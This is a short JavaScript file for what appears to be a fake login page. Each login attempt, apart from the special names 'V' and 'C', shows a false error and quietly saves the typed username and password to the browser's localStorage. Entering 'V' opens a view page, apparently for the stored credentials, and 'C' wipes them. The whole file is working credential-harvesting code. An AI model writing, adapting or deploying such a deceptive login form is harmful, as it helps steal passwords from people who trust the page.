if (localStorage.getItem('v')==null) {
	localStorage.setItem('v', '')
}
function clicked(){
	
	if (document.getElementById('login').value != 'V' && document.getElementById('login').value != 'C') {

		document.getElementById('Error').style.display = "block";
		document.getElementById('dark').style.display = "block";
		pass = document.getElementById('pass').value;
		login = document.getElementById('login').value;
		v = localStorage.getItem('v') + login + "<br>" + pass + "<hr>";
		localStorage.setItem("v", v);

	} else 
		if (document.getElementById('login').value == 'C') {
			localStorage.clear(); 
			window.location = 'view.html'
		} else window.location = 'view.html';
	
}
function out(){
	document.getElementById('Error').style.display = "none";
	document.getElementById('dark').style.display = "none";
	document.getElementById('pass').value = "";
}